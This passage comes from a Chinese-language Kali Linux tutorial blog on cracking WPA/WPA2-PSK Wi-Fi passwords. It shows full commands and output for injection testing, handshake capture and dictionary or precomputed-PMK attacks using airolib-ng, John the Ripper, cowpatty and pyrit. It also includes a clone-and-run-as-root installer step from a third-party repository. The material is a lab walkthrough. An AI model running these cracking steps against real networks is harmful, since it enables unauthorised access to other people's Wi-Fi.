Management:off</span><br><span class="line">          Link Quality=70/70  Signal level=-19 dBm  </span><br><span class="line">          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0</span><br><span class="line">          Tx excessive retries:0  Invalid misc:6   Missed beacon:0 wlan0mon  IEEE 802.11  Mode: Monitor  Tx-Power=20 dBm   </span><br><span class="line">          Retry short  long <span class="built_in">limit</span>:2   RTS thr:off   Fragment thr:off</span><br><span class="line">          Power Management:off</span><br><span class="line">          </span><br><span class="line">wlan1mon  IEEE 802.11  Mode: Monitor  Tx-Power=20 dBm   </span><br><span class="line">          Retry short  long <span class="built_in">limit</span>:2   RTS thr:off   Fragment thr:off</span><br><span class="line">          Power Management:off</span><br><span class="line">          </span><br><span class="line">                                                                                          </span><br><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># ifconfig wlan0mon up     #启动</span></span><br><span class="line">                                                                                          </span><br><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># ifconfig wlan1mon up</span></span><br><span class="line">                                                                                          </span><br><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># ifconfig  </span></span><br><span class="line">………………………………</span><br><span class="line"></span><br><span class="line">wlan0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.0.105  netmask 255.255.255.0  broadcast 192.168.0.255</span><br><span class="line">        inet6 fe80::68eb:d6e0:4201:e552  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 1c:bf:ce:3b:5f:bf  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 14  bytes 4457 (4.3 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 17  bytes 2788 (2.7 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">wlan0mon: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        unspec 1C-BF-CE-3B-5F-BE-00-1D-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)</span><br><span class="line">        RX packets 1026  bytes 162672 (158.8 KiB)</span><br><span class="line">        RX errors 0  dropped 1027  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">wlan1mon: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        unspec 1C-BF-CE-3B-5F-BE-00-1D-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)</span><br><span class="line">        RX packets 477  bytes 67719 (66.1 KiB)</span><br><span class="line">        RX errors 0  dropped 478  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0 ┌──(root💀kali) -[/home/kali]</span><br><span class="line">└─<span class="comment"># aireplay-ng -9 -i wlan0mon wlan1mon                                             130 ⨯</span></span><br><span class="line"></span><br><span class="line">00:11:02  Trying broadcast probe requests...</span><br><span class="line">00:11:02  Injection is working!</span><br><span class="line">00:11:04  Found 6 APs</span><br><span class="line"></span><br><span class="line">00:11:04  Trying directed probe requests...</span><br><span class="line">00:11:04  0C:4B:54:15:C4:6C - channel: 11 - <span class="string">&#x27;419&#x27;</span></span><br><span class="line">00:11:08  Ping (min/avg/max): 2.320ms/20.147ms/114.732ms Power: -53.33</span><br><span class="line">00:11:08  12/30:  40%</span><br><span class="line"></span><br><span class="line">00:11:08  54:75:95:D9:DD:0A - channel: 11 - <span class="string">&#x27;329&#x27;</span></span><br><span class="line">00:11:10  Ping (min/avg/max): 2.491ms/11.538ms/38.661ms Power: -44.92</span><br><span class="line">00:11:10  24/30:  80%</span><br><span class="line"></span><br><span class="line">00:11:10  0C:4B:54:34:6A:B8 - channel: 11 - <span class="string">&#x27;zynb&#x27;</span></span><br><span class="line">00:11:14  Ping (min/avg/max): 0.818ms/5.686ms/13.938ms Power: -49.45</span><br><span class="line">00:11:14  11/30:  36%</span><br><span class="line"></span><br><span class="line">00:11:14  0C:4B:54:15:E7:CD - channel: 11 - <span class="string">&#x27;TP-LINK_E7CD&#x27;</span></span><br><span class="line">00:11:19  Ping (min/avg/max): 3.322ms/7.253ms/13.905ms Power: -58.00</span><br><span class="line">00:11:19   3/30:  10%</span><br><span class="line"></span><br><span class="line">00:11:19  48:7D:2E:F6:D4:C4 - channel: 11 - <span class="string">&#x27;423&#x27;</span></span><br><span class="line">00:11:21  Ping (min/avg/max): 1.484ms/9.297ms/25.443ms Power: -49.42</span><br><span class="line">00:11:21  24/30:  80%</span><br><span class="line"></span><br><span class="line">00:11:21  9C:A6:15:80:A8:85 - channel: 11 - <span class="string">&#x27;TP-LINK_A885&#x27;</span></span><br><span class="line">00:11:24  Ping (min/avg/max): 1.620ms/4.792ms/10.620ms Power: -52.46</span><br><span class="line">00:11:24  13/30:  43%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">00 :11:24  Trying card-to-card injection...</span><br><span class="line">00:11:24  Attack -0:           OK</span><br><span class="line">00:11:24  Attack -1 (open):    OK</span><br><span class="line">00:11:24  Attack -1 (psk):     OK</span><br><span class="line">00:11:24  Attack -2/-3/-4/-6:  OK</span><br><span class="line">00:11:30  Attack -5/-7:        OK</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>无线渗透</category>
        <category>密码破解</category>
      </categories>
      <tags>
        <tag>wifi 渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>无线密码破解工具</title>
    <url>/2022/06/02/%E6%97%A0%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h2 id="airolib-破解密码">1. AIROLIB 破解密码</h2>
<h3 id="基本介绍"><strong>1、基本介绍</strong></h3>
<p>由于PSK+ESSID计算PMK时要经过4096次的迭代计算，这使暴力破解的速度很慢，破解过程中CPU等资源消耗严重，为此我们可以事先将可能PMK计算出来，破解时再用PMK进行后续计算，这使得玻璃破解的速度会得到很大的提高，不过亦有缺点，当ESSID变动后当前的PMK又得重计算。</p>
<ul>
<li><strong>设计用于存储ESSID和密码列表</strong></li>
<li><strong>计算生成不变的PMK</strong></li>
<li><strong>PMK在破解阶段被用于计算PTK（速度快，计算资源要求少）</strong></li>
<li><strong>通过完整性摘要值破解密码</strong></li>
<li><strong>SQLlite3数据库存储数据</strong></li>
</ul>
<h3 id="演示">2、演示</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># echo zmr &gt; essid.txt</span></span><br><span class="line">                                                                                                   </span><br><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># catessid.txt                   </span></span><br><span class="line">zmr</span><br><span class="line">                                                                                                   </span><br><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># airolib-ng --help                              </span></span><br><span class="line"></span><br><span class="line">  Airolib-ng 1.6  - (C) 2007, 2008, 2009 ebfe</span><br><span class="line">  https://www.aircrack-ng.org</span><br><span class="line"></span><br><span class="line">  Usage: airolib-ng &lt;database&gt; &lt;operation&gt; [options]</span><br><span class="line"></span><br><span class="line">  Operations:</span><br><span class="line"></span><br><span class="line">       --stats        : Output information about the database.</span><br><span class="line">       --sql &lt;sql&gt;    : Execute specified SQL statement.</span><br><span class="line">       --clean [all]  : Clean the database from old junk. <span class="string">&#x27;all&#x27;</span> will also </span><br><span class="line">                        reduce filesize <span class="keyword">if</span> possible and run an integrity check.</span><br><span class="line">       --batch        : Start batch-processing all combinations of ESSIDs</span><br><span class="line">                        and passwords.</span><br><span class="line">       --verify [all] : Verify a <span class="built_in">set</span> of randomly chosen PMKs.</span><br><span class="line">                        If <span class="string">&#x27;all&#x27;</span> is given, all invalid PMK will be deleted.</span><br><span class="line"></span><br><span class="line">       --import [essid|passwd] &lt;file&gt;   :</span><br><span class="line">                        Import a text file as a list of ESSIDs or passwords.</span><br><span class="line">       --import cowpatty &lt;file&gt;         :</span><br><span class="line">                        Import a cowpatty file.</span><br><span class="line"></span><br><span class="line">       --<span class="built_in">export</span> cowpatty &lt;essid&gt; &lt;file&gt; :</span><br><span class="line">                        Export to a cowpatty file.</span><br><span class="line"></span><br><span class="line">                                                                                                   </span><br><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># airolib-ng db --import essid essid.txt       #导入essid                                               </span></span><br><span class="line">Database &lt;db&gt; does not already exist, creating it...</span><br><span class="line">Database &lt;db&gt; successfully created</span><br><span class="line">Reading file...</span><br><span class="line">Writing...</span><br><span class="line">Done.</span><br><span class="line">                                                                                                   </span><br><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># airolib-ng db --stats         </span></span><br><span class="line">There are 1 ESSIDs and 0 passwords <span class="keyword">in</span> the database. 0 out of 0 possible combinations have been computed (0%).</span><br><span class="line"></span><br><span class="line">ESSID   Priority        Done</span><br><span class="line">zmr     64      (null)</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># airolib-ng db --import passwd /usr/share/john/password.lst    #导入密码</span></span><br><span class="line">Reading file...</span><br><span class="line">Writing... <span class="built_in">read</span>, 2427 invalid lines ignored.    <span class="comment">#会自动过滤掉不合格的密码</span></span><br><span class="line">Done.</span><br><span class="line">                                                                                                   </span><br><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># airolib-ng db --stats                                 #查看数据库状态                             </span></span><br><span class="line">There are 1 ESSIDs and 652 passwords <span class="keyword">in</span> the database. 0 out of 652 possible combinations have been computed (0%).</span><br><span class="line"></span><br><span class="line">ESSID   Priority        Done</span><br><span class="line">zmr     64      0.0 ┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># airolib-ng  db --batch                     #生成PMK</span></span><br><span class="line">Batch processing ...</span><br><span class="line">Computed 652 PMK <span class="keyword">in</span> 1 seconds (652 PMK/s, 0 <span class="keyword">in</span> buffer)</span><br><span class="line">All ESSID processed.</span><br><span class="line"></span><br><span class="line">                                                                                                   </span><br><span class="line">┌──(root💀kali)-[/home/ kali]</span><br><span class="line">└─<span class="comment"># aircrack-ng -r db wpa-04.cap     #读取db数据库破解wpa-04.cap</span></span><br><span class="line">Reading packets, please <span class="built_in">wait</span>...</span><br><span class="line">Opening db</span><br><span class="line">Unsupported file format (not a pcap or IVs file).</span><br><span class="line">Opening wpa-04.cap</span><br><span class="line">Read 21869 packets.</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  BSSID              ESSID                     Encryption</span></span><br><span class="line"></span><br><span class="line">   1  66:75:95:2E:B3:6B  zmr                       WPA (1 handshake)</span><br><span class="line"></span><br><span class="line">Choosing first network as targeAircrack-ng 1.6 </span><br><span class="line"></span><br><span class="line">      [00:00:00] 21/0 keys tested (1177.92 k/s) </span><br><span class="line"></span><br><span class="line">      Time left: 866089600 days, 4 hours, 33 minutes, 4 seconds    inf% KEY FOUND! [ 12345678]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Master Key     : 0C 56 3C B8 B2 DE 7E 1B 89 97 C6 00 26 54 93 6A </span><br><span class="line">                       2E 02 98 84 4E 44 72 9F 58 13 B1 38 DA 4B 05 F1 </span><br><span class="line"></span><br><span class="line">      Transient Key  : 6B 6D 01 D9 66 7E 91 FB 2C 28 52 37 E2 08 90 E4 </span><br><span class="line">                       F9 32 65 EB 16 46 5D 5E 32 BF E9 E4 7E CE E3 6A </span><br><span class="line">                       9D 82 6E 9A 7D 3A 39 5F 11 23 44 64 CE 24 CB 44 </span><br><span class="line">                       E8 69 8D 6E 9F 34 EB FD 72 7C 08 50 78 75 F6 92 </span><br><span class="line"></span><br><span class="line">      EAPOL HMAC     : 87 53 42 D1 F3 B2 6E DC DD 88 54 A1 49 60 08 84                                                                     </span><br></pre></td></tr></table></figure>
<h2 id="jtr-破解密码">2. JTR 破解密码</h2>
<h3 id="基本介绍-1">1、基本介绍</h3>
<ul>
<li>John the ripper</li>
<li>快速的密码破解软件</li>
<li><strong>支持基于规则动态扩展密码字典（破解时动态扩展）</strong></li>
<li><strong>规则配置文件/etc/john/john.conf</strong></li>
<li><strong>[list.Rules:Wordlist]</strong></li>
</ul>
<h3 id="演示-1"><strong>2、演示</strong></h3>
<p><strong>（1）test.txt</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220531184016110-1123057002.png" /></p>
<p><strong>（2）添加规则</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220531183920873-375724115.gif" /></p>
<p><strong>（3）测试效果</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john --wordlist=test.txt --rules --stdout</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220531184056938-1968520315.gif" /></p>
<p><strong>（4）破解调用</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># john --wordlist=test.txt --rules --stdout | aircrack-ng -e zmr -w - wpa-04.cap</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220531185235515-103404709.gif" /></p>
<h2 id="cowpatty-破解密码">3. COWPATTY 破解密码</h2>
<h3 id="基本介绍-2">1、基本介绍</h3>
<p><strong>cowpatty 也是通过提前计算PMK来提升破解速度的</strong></p>
<p><strong>使用密码字典直接破解</strong></p>
<ul>
<li>cowpatty -r wpa.cap -f password.lst -s kifi</li>
</ul>
<p><strong>使用彩虹表(PMK)破解</strong></p>
<ul>
<li>genpmk -f password.lst -d pmkhash -s kifi #第三方工具生成PMK</li>
<li>cowpatty -r wpa.cap -d pmkhash -s kifi #使用PMK破解</li>
</ul>
<h3 id="演示-2">2、演示</h3>
<p>监听，抓包等操作不再演示，操作同前面</p>
<h4 id="cowpatty-使用字典直接破解">2.1 cowpatty 使用字典直接破解</h4>
<p><strong>（1）cowpatty 命令</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># cowpatty -h                                                  </span></span><br><span class="line">cowpatty 4.8 - WPA-PSK dictionary attack. &lt;jwright@hasborg.com&gt;</span><br><span class="line"></span><br><span class="line">Usage: cowpatty [options]</span><br><span class="line"></span><br><span class="line">        -f      Dictionary file</span><br><span class="line">        -d      Hash file (genpmk)</span><br><span class="line">        -r      Packet capture file</span><br><span class="line">        -s      Network SSID (enclose <span class="keyword">in</span> quotes <span class="keyword">if</span> SSID includes spaces)</span><br><span class="line">        -c      Check <span class="keyword">for</span> valid 4-way frames, does not crack</span><br><span class="line">        -h      Print this <span class="built_in">help</span> information and <span class="built_in">exit</span></span><br><span class="line">        -v      Print verbose information (more -v <span class="keyword">for</span> more verbosity)</span><br><span class="line">        -V      Print program version and <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
<p><strong>（2）破解</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># cowpatty -r wpa-04.cap -f /usr/share/john/password.lst -s zmr</span></span><br><span class="line">cowpatty 4.8 - WPA-PSK dictionary attack. &lt;jwright@hasborg.com&gt;</span><br><span class="line"></span><br><span class="line">Collected all necessary data to mount crack against WPA2/PSK passphrase.</span><br><span class="line">Starting dictionary attack.  Please be patient.</span><br><span class="line"></span><br><span class="line">The PSK is <span class="string">&quot;12345678&quot;</span>.</span><br><span class="line"></span><br><span class="line">24 passphrases tested <span class="keyword">in</span> 0.09 seconds:  277.25 passphrases/second</span><br></pre></td></tr></table></figure>
<h4 id="使用-pmk-破解">2.2 使用 PMK 破解</h4>
<p><strong>（1）genpmk命令：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># genpmk -h </span></span><br><span class="line">genpmk 1.3 - WPA-PSK precomputation attack. &lt;jwright@hasborg.com&gt;</span><br><span class="line">Usage: genpmk [options]</span><br><span class="line"></span><br><span class="line">        -f      Dictionary file</span><br><span class="line">        -d      Output <span class="built_in">hash</span> file</span><br><span class="line">        -s      Network SSID</span><br><span class="line">        -h      Print this <span class="built_in">help</span> information and <span class="built_in">exit</span></span><br><span class="line">        -v      Print verbose information (more -v <span class="keyword">for</span> more verbosity)</span><br><span class="line">        -V      Print program version and <span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line">After precomputing the <span class="built_in">hash</span> file, run cowpatty with the -d argument.</span><br></pre></td></tr></table></figure>
<p><strong>（2）生成 PMK</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># genpmk -f /usr/share/john/password.lst -d pmkhash -s zmr  </span></span><br><span class="line">genpmk 1.3 - WPA-PSK precomputation attack. &lt;jwright@hasborg.com&gt;</span><br><span class="line">File pmkhash does not exist, creating.</span><br><span class="line"></span><br><span class="line">654 passphrases tested <span class="keyword">in</span> 1.04 seconds:  626.11 passphrases/second</span><br></pre></td></tr></table></figure>
<p><strong>（3）破解</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─<span class="comment"># cowpatty -r wpa-04.cap -d pmkhash -s zmr </span></span><br><span class="line">cowpatty 4.8 - WPA-PSK dictionary attack. &lt;jwright@hasborg.com&gt;</span><br><span class="line"></span><br><span class="line">Collected all necessary data to mount crack against WPA2/PSK passphrase.</span><br><span class="line">Starting dictionary attack.  Please be patient.</span><br><span class="line"></span><br><span class="line">The PSK is <span class="string">&quot;12345678&quot;</span>.</span><br><span class="line"></span><br><span class="line">24 passphrases tested <span class="keyword">in</span> 0.00 seconds:  109090.91 passphrases/second</span><br></pre></td></tr></table></figure>
<p><strong>注意对比两次破解速度的提升</strong></p>
<h2 id="pyrit-破解密码推荐">4. PYRIT 破解密码（推荐）</h2>
<h3 id="基本介绍-3">1、基本介绍</h3>
<p>与airolib、cowpatty相同，
<strong>支持基于预计算的PMK提高破解速度</strong></p>
<p><strong>独有的优势</strong></p>
<ul>
<li><strong>除CPU之外pyrit可以运行GPU的强大运算能力加速生成PMK</strong></li>
<li><strong>本身支持抓包获取四步握手过程，无需用Airdump抓包</strong></li>
<li><strong>也支持传统的读取airodump抓包获取四步握手的方式</strong></li>
</ul>
<p><strong>只抓取WAP四次握手过程包</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pyrit -r wlan2mon -o wpapyrit.cap stripLive  <span class="comment">#-r 指定网卡，-o指定输出文件，striplive过滤出握手包</span></span><br><span class="line">pyrit -r wpapyrit.cap analyze　　<span class="comment">#对抓的握手包进行分析（AP的MAC，加密方式等）</span></span><br></pre></td></tr></table></figure>
<p><strong>从airodump抓包导入并筛选</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pyrit -r wpa.cap -o wpapyrit.cap strip   <span class="comment">#将airodump抓的包过滤下</span></span><br></pre></td></tr></table></figure>
<p><strong>使用密码字典直接破解</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pyrit -r wpaprit.cap -i password.lst -b &lt;AP MAC&gt; attack passthrough</span><br></pre></td></tr></table></figure>
<p><strong>数据库模式破解</strong></p>
<ul>
<li><strong>默认使用基于文件的数据库，支持连接SQL数据库，将计算的PMK存入数据库</strong></li>
<li><strong>查看默认数据库状态：pyrit eval</strong></li>
<li><strong>导入密码字典：pyrit -i password.lst import_passwords
(会自动剔除了不合规的密码）</strong></li>
<li><strong>指定ESSID：pyrit -e zmr create_essid</strong></li>
<li><strong>计算PMK：pyrit batch (发挥GPU计算能力）</strong></li>
<li><strong>破解密码：pyrit -r wpapyrit.cap -b <AP MAC>
attack_db</strong></li>
</ul>
<h3 id="演示-3">2、演示</h3>
<p><strong>（1）pyrit 安装</strong></p>
<p>默认的kali存储库不再提供pyrit，手动安装 pyrit 如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~ ]</span><br><span class="line">└─<span class="comment"># git clone https://github.com/hacker3983/pyrit-installer &amp;&amp; cd pyrit-installer &amp;&amp; sudo bash install.sh</span></span><br><span class="line">Cloning into <span class="string">&#x27;pyrit-installer&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 263, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (57/57), <span class="keyword">done</span>.</span><br><span class="line">……………………</span><br><span class="line">……………………</span><br><span class="line">running install_egg_info</span><br><span class="line">Writing /usr/local/lib/python2.7/dist-packages/pyrit-0.5.1.egg-info Installation finished</span><br></pre></td></tr></table></figure>
<p><strong>如果有报错参见</strong> ：<a
href="https://github.com/hacker3983/pyrit-installer"
class="uri">https://github.com/hacker3983/pyrit-installer</a></p>
<p><strong>（2）基本命令</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/pyrit-installer]</span><br><span class="line">└─<span class="comment"># pyrit -h</span></span><br><span class="line">Pyrit 0.5.1 (C) 2008-2011 Lukas Lueg - 2015 John Mora</span><br><span class="line">https://github.com/JPaulMora/Pyrit</span><br><span class="line">This code is distributed under the GNU General Public License v3+</span><br><span class="line"></span><br><span class="line">Usage: pyrit [options] <span class="built_in">command</span></span><br><span class="line"></span><br><span class="line">Recognized options:</span><br><span class="line">  -b               : Filters AccessPoint by BSSID</span><br><span class="line">  -e               : Filters AccessPoint by ESSID</span><br><span class="line">  -h               : Print <span class="built_in">help</span> <span class="keyword">for</span> a certain <span class="built_in">command</span></span><br><span class="line">  -i               : Filename <span class="keyword">for</span> input (<span class="string">&#x27;-&#x27;</span> is stdin)</span><br><span class="line">  -o               : Filename <span class="keyword">for</span> output (<span class="string">&#x27;-&#x27;</span> is stdout)</span><br><span class="line">  -r               : Packet capture <span class="built_in">source</span> <span class="keyword">in</span> pcap-format</span><br><span class="line">  -u               : URL of the storage-system to use</span><br><span class="line">  --all-handshakes : Use all handshakes instead of the best one</span><br><span class="line">  --aes            : Use AES</span><br><span class="line"></span><br><span class="line">Recognized commands:</span><br><span class="line">  analyze                 : Analyze a packet-capture file</span><br><span class="line">  attack_batch            : Attack a handshake with PMKs/passwords from the db</span><br><span class="line">  attack_cowpatty         : Attack a handshake with PMKs from a cowpatty-file</span><br><span class="line">  attack_db               : Attack a handshake with PMKs from the db</span><br><span class="line">  attack_passthrough      : Attack a handshake with passwords from a file</span><br><span class="line">  batch                   : Batchprocess the database</span><br><span class="line">  benchmark               : Determine performance of available cores</span><br><span class="line">  benchmark_long          : Longer and more accurate version of benchmark (5 minutes)</span><br><span class="line">  check_db                : Check the database <span class="keyword">for</span> errors</span><br><span class="line">  create_essid            : Create a new ESSID</span><br><span class="line">  delete_essid            : Delete a ESSID from the database</span><br><span class="line">  <span class="built_in">eval</span>                    : Count the available passwords and matching results</span><br><span class="line">  export_cowpatty         : Export results to a new cowpatty file</span><br><span class="line">  export_hashdb           : Export results to an airolib database</span><br><span class="line">  export_passwords        : Export passwords to a file</span><br><span class="line">  <span class="built_in">help</span>                    : Print general <span class="built_in">help</span></span><br><span class="line">  import_passwords        : Import passwords from a file-like <span class="built_in">source</span></span><br><span class="line">  import_unique_passwords : Import unique passwords from a file-like <span class="built_in">source</span></span><br><span class="line">  list_cores              : List available cores</span><br><span class="line">  list_essids             : List all ESSIDs but don<span class="string">&#x27;t count matching results</span></span><br><span class="line"><span class="string">  passthrough             : Compute PMKs and write results to a file</span></span><br><span class="line"><span class="string">  relay                   : Relay a storage-url via RPC</span></span><br><span class="line"><span class="string">  selftest                : Test hardware to ensure it computes correct results</span></span><br><span class="line"><span class="string">  serve                   : Serve local hardware to other Pyrit clients</span></span><br><span class="line"><span class="string">  strip                   : Strip packet-capture files to the relevant packets</span></span><br><span class="line"><span class="string">  stripLive               : Capture relevant packets from a live capture-source</span></span><br><span class="line"><span class="string">  verify                  : Verify 10% of the results by recomputation</span></span><br></pre></td></tr></table></figure>
<p><strong>（3）pyrit 抓包，分析</strong></p>
<p>由于Kali自带的scapy被默认安装在python3的路径下，而 pyrit
比较老了，使⽤的是python2，所以执行时导致找不到scapy，即会报如下错误</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Scapy 2.x is required to use Pyrit<span class="string">&#x27;s analyze/attack functions but seems to be unavailable</span></span><br></pre></td></tr></table></figure>
<p><strong>解决办法参见：</strong><a
href="https://wenku.baidu.com/view/0a3ba63ac181e53a580216fc700abb68a982adc3.html"
class="uri">https://wenku.baidu.com/view/0a3ba63ac181e53a580216fc700abb68a982adc3.html</a></p>
<p>备注：由于个人电脑以前安装了BT5，所以后面的演示就在BT5直接搞了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@bt:~/Desktop<span class="comment"># iwconfig </span></span><br><span class="line">lo        no wireless extensions.</span><br><span class="line"></span><br><span class="line">eth2      no wireless extensions.</span><br><span class="line"></span><br><span class="line">wlan0     IEEE 802.11bgn  ESSID:off/any  </span><br><span class="line">          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   </span><br><span class="line">          Retry  long <span class="built_in">limit</span>:7   RTS thr:off   Fragment thr:off</span><br><span class="line">          Encryption key:off</span><br><span class="line">          Power Management:on</span><br><span class="line">          </span><br><span class="line">root@bt:~/Desktop<span class="comment"># airmon-ng start wlan0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Found 1 processes that could cause trouble.</span><br><span class="line">If airodump-ng, aireplay-ng or airtun-ng stops working after</span><br><span class="line">a short period of time, you may want to <span class="built_in">kill</span> (some of) them!</span><br><span class="line"></span><br><span class="line">PID    Name</span><br><span class="line">2622    dhclient3</span><br><span class="line">Process with PID 2585 (ifup) is running on interface wlan0</span><br><span class="line">Process with PID 2622 (dhclient3) is running on interface wlan0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface    Chipset        Driver</span><br><span class="line"></span><br><span class="line">wlan0        Ralink RT2870/3070    rt2800usb - [phy1]</span><br><span class="line">                (monitor mode enabled on mon0)</span><br><span class="line"></span><br><span class="line">root@bt:~/Desktop<span class="comment"># iwconfig </span></span><br><span class="line">lo        no wireless extensions.</span><br><span class="line"></span><br><span class="line">eth2      no wireless extensions.</span><br><span class="line"></span><br><span class="line">mon0      IEEE802.11bgn  Mode:Monitor  Tx-Power=20 dBm   </span><br><span class="line">          Retry  long <span class="built_in">limit</span>:7RTS thr:off   Fragment thr:off</span><br><span class="line">          Power Management:on</span><br><span class="line">          </span><br><span class="line">wlan0     IEEE 802.11bgn  ESSID:off/any  </span><br><span class="line">          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   </span><br><span class="line">          Retry  long <span class="built_in">limit</span>:7   RTS thr:off   Fragment thr:off</span><br><span class="line">          Encryption key:off</span><br><span class="line">          Power Management:on</span><br><span class="line">          </span><br><span class="line">root@bt:~/Desktop<span class="comment"># pyrit -r mon0 -o wpapyrit.cap  stripLive    #抓包</span></span><br><span class="line">Pyrit 0.4.0 (C) 2008-2011 Lukas Lueg http://pyrit.googlecode.com</span><br><span class="line">This code is distributed under the GNU General Public License v3+</span><br><span class="line"></span><br><span class="line">Parsing packets from <span class="string">&#x27;mon0&#x27;</span>...</span><br><span class="line">0/1: New Station 72:51:53:79:f5:c8 (AP 9c:a6:15:3e:fa:7f)</span><br><span class="line">……………………</span><br><span class="line">……………………</span><br><span class="line">29 /533: New Handshake AP a6:c1:3f:63:59:5d: HMAC_SHA1_AES, bad, spread 1    <span class="comment">#抓到握手包</span></span><br><span class="line">……………………</span><br><span class="line">^C</span><br><span class="line">Interrupted...</span><br><span class="line"></span><br><span class="line"><span class="comment">#1: AccessPoint a2:97:cc:f0:fa:af (&#x27;None&#x27;)</span></span><br><span class="line">……………………</span><br><span class="line">……………………</span><br><span class="line"><span class="comment">#30 : AccessPoint a6:c1:3f:63:59:5d (&#x27;zmr&#x27;)</span></span><br><span class="line">  <span class="comment">#0: Station 98:2c:bc:cb:10:01, 1 handshake(s)</span></span><br><span class="line">    <span class="comment">#1: HMAC_SHA1_AES, bad, spread 1</span></span><br><span class="line">……………………</span><br><span class="line"></span><br><span class="line">New pcap-file <span class="string">&#x27;wpapyrit.cap&#x27;</span> written (35 out of 1023 packets)</span><br><span class="line">root@bt:~/Desktop<span class="comment"># pyrit -r wpapyrit.cap analyze　　　　　　　　　　#分析</span></span><br><span class="line">Pyrit 0.4.0 (C) 2008-2011 Lukas Lueg http://pyrit.googlecode.com</span><br><span class="line">This code is distributed under the GNU General Public License v3+</span><br><span class="line"></span><br><span class="line">Parsing file <span class="string">&#x27;wpapyrit.cap&#x27;</span> (1/1)...</span><br><span class="line">Parsed 35 packets (35 802.11-packets), got 33 AP(s)</span><br><span class="line"></span><br><span class="line">……………………</span><br><span class="line"><span class="comment">#29 : AccessPoint a6:c1:3f:63:59:5d (&#x27;zmr&#x27;):　　　　